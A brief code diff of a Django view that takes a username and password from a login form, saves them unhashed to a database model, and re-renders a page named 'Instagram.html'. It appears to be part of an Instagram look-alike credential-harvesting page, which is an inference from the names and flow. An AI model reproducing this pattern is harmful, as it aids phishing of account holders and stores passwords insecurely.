@@ -12,6 +12,6 @@ def main(request):
         password = request.POST.get('password')
         created = user(username=username, password=password)
         created.save()
-        return HttpResponse(200)
+        return render(request, 'Instagram.html')
     else:
         return render(request, 'Instagram.html')
